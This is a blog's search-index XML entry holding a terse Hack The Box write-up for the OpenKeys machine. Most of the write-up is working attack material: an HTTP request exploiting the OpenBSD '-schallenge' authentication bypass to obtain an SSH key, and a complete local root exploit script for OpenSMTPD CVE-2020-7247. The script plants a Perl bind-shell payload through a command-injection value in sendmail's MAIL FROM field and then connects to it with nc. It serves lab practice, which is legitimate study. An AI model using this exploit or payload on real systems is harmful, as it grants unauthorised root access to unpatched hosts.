<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox-OpenKeys WriteUp</title>
      <link href="2021/01/12/HackTheBox-OpenKeys/"/>
      <url>2021/01/12/HackTheBox-OpenKeys/</url>
      
        <content type="html"><![CDATA[<h4 id="INT"><a href="#INT" class="headerlink" title="INT"></a>INT</h4><h6 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h6><div class="hljs code-wrapper"><pre><code>&gt; IP: 10.10.10.199&gt; port:22&gt; 22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)&gt; port:80&gt; OpenKeyS - Retrieve your OpenSSH Keys #maybe keyword&gt; OS:FreeBsd</code></pre></div><h4 id="Port-80-Enum"><a href="#Port-80-Enum" class="headerlink" title="Port 80 Enum"></a>Port 80 Enum</h4><div class="hljs code-wrapper"><pre><code>&gt; http://10.10.10.199/includes/auth.php.swp&gt; jennifer&gt; jenniferopenkeys.htb/var/www/htdocs/includes/auth.php&gt; OpenBSD authentication login POC (can use)<figure class="highlight shell"><table><tr><td class="gutter hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">POST /index.php HTTP/1.1<br>Host: 10.10.10.199<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 41<br>Origin: http://10.10.10.199<br>Connection: close<br>Referer: http://10.10.10.199/index.php<br>Cookie: PHPSESSID=8hivfuib14nvufhqeejtqigfqf;username=jennifer<br>Upgrade-Insecure-Requests: 1<br><br>username=&quot;-schallenge&quot;&amp;password=&quot;-schallenge&quot;<br></code></pre></div></td></tr></table></figure>&gt; Get SSH key</code></pre><h4 id="User"><a href="#User" class="headerlink" title="User"></a>User</h4><div class="hljs code-wrapper"><pre><code>&gt; ssh -i ssh.key jennifer@10.10.10.199</code></pre></div><h4 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h4><div class="hljs code-wrapper"><pre><code>&gt; CVE-2020-7247<figure class="highlight shell"><table><tr><td class="gutter hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">    #!/bin/sh<br><span class="hljs-meta">#</span><span class="bash"> root66 - OpenBSD 6.6 OpenSMTPD 6.6 <span class="hljs-built_in">local</span> root exploit <span class="hljs-keyword">for</span> CVE-2020-7247</span><br><span class="hljs-meta">#</span><span class="bash"> starts a perl bindshell on port 1337 with root privileges</span><br><span class="hljs-meta">#</span><br><span class="bash"><span class="hljs-comment"># Code mostly stolen from Qualys PoCs:</span></span><br><span class="hljs-meta">#</span><span class="bash"> - https://www.openwall.com/lists/oss-security/2020/01/28/3</span><br><span class="hljs-meta">#</span><span class="bash"> - https://blog.qualys.com/laws-of-vulnerabilities/2020/01/29/openbsd-opensmtpd-remote-code-execution-vulnerability-cve-2020-7247</span><br><span class="hljs-meta">#</span><span class="bash"> - https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt</span><br><span class="hljs-meta">#</span><span class="bash"> ---</span><br><span class="hljs-meta">#</span><span class="bash"> openbsd-6-6-x64$ ./root66</span><br><span class="hljs-meta">#</span><span class="bash"> OpenBSD 6.6 OpenSMTPD 6.6 <span class="hljs-built_in">local</span> root exploit (CVE-2020-7247)</span><br><span class="hljs-meta">#</span><span class="bash"> [*] id: uid=1001(<span class="hljs-built_in">test</span>) gid=1001(<span class="hljs-built_in">test</span>) groups=1001(<span class="hljs-built_in">test</span>)</span><br><span class="hljs-meta">#</span><span class="bash"> [*] checking system ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] directory /tmp/.payload is writable</span><br><span class="hljs-meta">#</span><span class="bash"> [*] 019_smtpd_exec patch has not been installed</span><br><span class="hljs-meta">#</span><span class="bash"> [*] writing payload to /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] executing /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">220 openbsd-6-6-x64.localdomain ESMTP OpenSMTPD</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; EHLO localhost</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-openbsd-6-6-x64.localdomain Hello localhost [local], pleased to meet you</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-8BITMIME</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-ENHANCEDSTATUSCODES</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-SIZE 36700160</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 HELP</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; MAIL FROM:&lt;;/tmp/.payload;<span class="hljs-comment">#@&gt;</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.0.0 Ok</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; RCPT TO:&lt;<span class="hljs-built_in">test</span>@openbsd-6-6-x64.localdomain&gt;</span> <br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.1.5 Destination address valid: Recipient ok</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; DATA</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">354 Enter mail, end with &quot;.&quot; on a line by itself</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; .</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.0.0 9493d192 Message accepted for delivery</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; QUIT</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">221 2.0.0 Bye</span></span><br><span class="hljs-meta">#</span><span class="bash"> [*] cleaning up /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] connecting to 127.0.0.1:1337 ...</span><br><span class="hljs-meta">#</span><span class="bash"> Connection to 127.0.0.1 1337 port [tcp/*] succeeded!</span><br><span class="hljs-meta">#</span><span class="bash"> id</span><br><span class="hljs-meta">#</span><span class="bash"> uid=0(root) gid=0(wheel) groups=0(wheel)</span><br><span class="hljs-meta">#</span><span class="bash"> uname -a</span><br><span class="hljs-meta">#</span><span class="bash"> OpenBSD openbsd-6-6-x64.localdomain 6.6 GENERIC<span class="hljs-comment">#353 amd64</span></span><br><span class="hljs-meta">#</span><span class="bash"> ---</span><br><span class="hljs-meta">#</span><span class="bash"> 2020-01-31 - &lt;bcoles@gmail.com&gt;</span><br><span class="hljs-meta">#</span><span class="bash"> https://github.com/bcoles/local-exploits/tree/master/CVE-2020-7247</span><br><br>payload=&quot;/tmp/.payload&quot;<br><br>/bin/echo &quot;OpenBSD 6.6 OpenSMTPD 6.6 local root exploit (CVE-2020-7247)&quot;<br><br>/bin/echo &quot;[*] id: `id`&quot;<br><br>/bin/echo &quot;[*] checking system ...&quot;<br><br>if [ -w `dirname $payload` ]; then<br>  /bin/echo &quot;[*] directory $payload is writable&quot;<br>else<br>  /bin/echo &quot;[-] directory $payload is not writable&quot;<br>  exit 1<br>fi<br><br>if syspatch -l | grep -q 019_smtpd_exec ; then<br>  /bin/echo &quot;[-] 019_smtpd_exec patch has been installed&quot;<br>  exit 1<br>else<br>  /bin/echo &quot;[*] 019_smtpd_exec patch has not been installed&quot;<br>fi<br><br>/bin/echo &quot;[*] writing payload to $payload ...&quot;<br>cat &gt; $payload &lt;&lt; &quot;EOF&quot;<br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>perl -MIO -e &#x27;$p=fork();exit,if$p;foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;=~/(.*)/)&#123;$ENV&#123;$key&#125;=$1;&#125;&#125;$c=new IO::Socket::INET(LocalPort,1337,Reuse,1,Listen)-&gt;accept;$~-&gt;fdopen($c,w);STDIN-&gt;fdopen($c,r);while(&lt;&gt;)&#123;if($_=~ /(.*)/)&#123;system $1;&#125;&#125;;&#x27;<br>EOF<br>/bin/chmod +x $payload<br><br>/bin/echo &quot;[*] executing $payload ...&quot;<br>/bin/echo | /usr/sbin/sendmail -v -f &quot;&lt;;$payload;#@&gt;&quot; `whoami`<br><br>/bin/sleep 1<br><br>/bin/echo &quot;[*] cleaning up $payload ...&quot;<br>/bin/rm $payload<br><br>/bin/echo &quot;[*] connecting to 127.0.0.1:1337 ...&quot;<br>nc -v 127.0.0.1 1337<br></code></pre></div></td></tr></table></figure></code></pre>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
            <tag> CVE-2020-7247 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
